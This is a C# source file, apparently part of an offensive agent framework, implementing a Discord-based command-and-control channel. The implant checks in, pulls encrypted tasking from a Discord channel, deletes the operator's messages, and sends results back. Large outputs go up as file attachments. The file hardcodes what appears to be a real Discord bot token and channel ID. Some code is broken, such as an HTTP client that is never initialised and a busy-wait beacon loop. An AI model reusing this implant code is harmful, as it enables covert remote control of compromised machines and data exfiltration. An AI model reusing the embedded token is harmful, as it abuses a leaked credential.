using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Text.Json;
using System.Collections.Concurrent;
using System.Text;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using Discord;
using Discord.WebSocket;
using Newtonsoft.Json;
using System;
namespace Agent.Profiles
{
    public class DiscordProfile : IProfile
    {
        private IAgentConfig agentConfig { get; set; }
        private ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private AutoResetEvent clientReady = new AutoResetEvent(false);
        private readonly string _token;
        private readonly ulong _channel_id;
        private readonly string _uuid = Guid.NewGuid().ToString();
        private ITextChannel _channel { get; set; }
        private readonly DiscordSocketClient _client;
        private readonly HttpClient _httpClient; 
        private CheckinResponse cir;

        private bool checkedin = false;
        private bool connected = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;

        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;

        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public DiscordProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            crypt = crypto;
            agentConfig = config;
            this.messageManager = messageManager;
            _token = "MTE2MTgxMzU2MDc1ODg5ODg1MA.G6w5Wa.fG_vCUM5vlzDmkArxqElYfU5X4LYx9mOEltu8s";
            _channel_id = ulong.Parse("1161813089545638040");
            var gateway_config = new DiscordSocketConfig()
            {
                GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent
            };
            _client = new DiscordSocketClient(gateway_config);
            _client.MessageReceived += _client_MessageReceived;
            _client.Ready += _client_Ready;
        }

        private async Task _client_Ready()
        {
            clientReady.Set();
        }

        private async Task _client_MessageReceived(SocketMessage message)
        {
            Console.WriteLine("Message Received: " + message.Content);
            MessageWrapper discordMessage;
            if (message.Attachments.Count > 0 && message.Attachments.FirstOrDefault().Filename.EndsWith("txt"))
            {
                discordMessage = JsonConvert.DeserializeObject<MessageWrapper>(await GetFileContentsAsync(message.Attachments.FirstOrDefault().Url));
            }
            else
            {
                discordMessage = JsonConvert.DeserializeObject<MessageWrapper>(message.Content);
            }

            if (discordMessage is not null &! discordMessage.to_server && discordMessage.client_id == _uuid) //It belongs to us
            {
                Console.WriteLine("Got Message: " + discordMessage.message);
                _ = message.DeleteAsync();

                if (!checkedin)
                {
                    cir = System.Text.Json.JsonSerializer.Deserialize(this.crypt.Decrypt(discordMessage.message), CheckinResponseJsonContext.Default.CheckinResponse);
                    checkinAvailable.Set();
                    return;
                }

                //If we make it to here, it's a tasking response
                GetTaskingResponse gtr = System.Text.Json.JsonSerializer.Deserialize(this.crypt.Decrypt(discordMessage.message), GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                if (gtr == null)
                {
                    return;
                }

                TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                this.SetTaskingReceived(this, tra);
            }
        }

        private async Task<bool> Start()
        {
            await _client.StartAsync();
            await _client.LoginAsync(TokenType.Bot, _token);
            clientReady.WaitOne();
            return _client.LoginState == LoginState.LoggedIn;
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            //Write our checkin message to the pipe

            await this.Send(System.Text.Json.JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

            //Wait for a checkin response message
            checkinAvailable.Wait();

            //We got a checkin response, so let's finish the checkin process
            this.checkedin = true;

            return this.cir;
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            this.cancellationTokenSource = new CancellationTokenSource();
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                //Check if we have something to send.
                if (!this.messageManager.HasResponses())
                {
                    continue;
                }

                try
                {
                    await this.Send(await messageManager.GetAgentResponseStringAsync());
                }
                catch (Exception e)
                {
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }
            }
        }
        internal async Task<string> Send(string json)
        {
            if(_client.LoginState != LoginState.LoggedIn)
            {
                await this.Start();
            }

            string msg = this.crypt.Encrypt(json);
            MessageWrapper discordMessage = new MessageWrapper()
            {
                to_server = true,
                sender_id = _uuid,
                message = msg,
                client_id = "",
            };

            Console.WriteLine(_channel_id);
            Console.WriteLine(_client.LoginState);
            Console.WriteLine(_client.ConnectionState);
            Console.WriteLine(_client.Status);

            ITextChannel channel = (ITextChannel)_client.GetChannel(_channel_id);

            var chan = _client.GetChannel(1161813089545638040) as ITextChannel;

            if (chan is null)
            {
                Console.WriteLine("NO channel.");
            }

            if (json.Length > 1950)
            {
                await channel.SendFileAsync(System.Text.Json.JsonSerializer.Serialize(discordMessage), discordMessage.sender_id + ".server");
            }
            else
            {
                await channel.SendMessageAsync(System.Text.Json.JsonSerializer.Serialize(discordMessage));
            }

            return String.Empty;
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }
        private async Task<string> GetFileContentsAsync(string url)
        {
            string message;
            using (HttpResponseMessage response = await _httpClient.GetAsync(url))
            {
                using (HttpContent content = response.Content)
                {
                    message = await content.ReadAsStringAsync();
                }
            }
            return await Unescape(message) ?? "";
        }
        private async Task<string> Unescape(string message)
        {
            return message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");

        }
    }
}
